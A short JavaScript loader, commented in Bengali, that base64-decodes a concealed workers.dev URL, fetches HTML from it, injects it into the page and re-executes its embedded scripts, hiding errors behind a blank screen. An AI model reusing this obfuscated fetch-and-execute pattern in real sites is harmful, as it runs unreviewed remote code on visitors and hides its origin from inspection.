(async function() {
    // আপনার অরেঞ্জ-হোস্টের লিঙ্কটি এখানে এনক্রিপ্ট করা আছে
    const _0x_key = "aHR0cHM6Ly9vcmFuZ2Vob3N0Lm9yYW5nZS1wcmludC10b29scy53b3JrZXJzLmRldi9wL215LXByZmwv";
    const _0x_url = atob(_0x_key);

    try {
        const _0x_res = await fetch(_0x_url);
        if (!_0x_res.ok) throw new Error();
        
        const _0x_html = await _0x_res.text();
        const _0x_app = document.getElementById('app');

        if (_0x_app) {
            // আসল কন্টেন্ট এখানে ইনজেক্ট হচ্ছে
            _0x_app.innerHTML = _0x_html;
            
            // স্ক্রিপ্টগুলো পুনরায় লোড করা হচ্ছে যাতে এনিমেশন কাজ করে
            const _0x_sc = Array.from(_0x_app.querySelectorAll('script'));
            for (const _0x_s of _0x_sc) {
                const _0x_new = document.createElement('script');
                Array.from(_0x_s.attributes).forEach(a => _0x_new.setAttribute(a.name, a.value));
                if (_0x_s.innerHTML) _0x_new.textContent = _0x_s.innerHTML;
                document.body.appendChild(_0x_new);
                _0x_s.remove();
            }
        }
    } catch (err) {
        // এরর হলে শুধু কালো স্ক্রিন দেখাবে
    }
})();
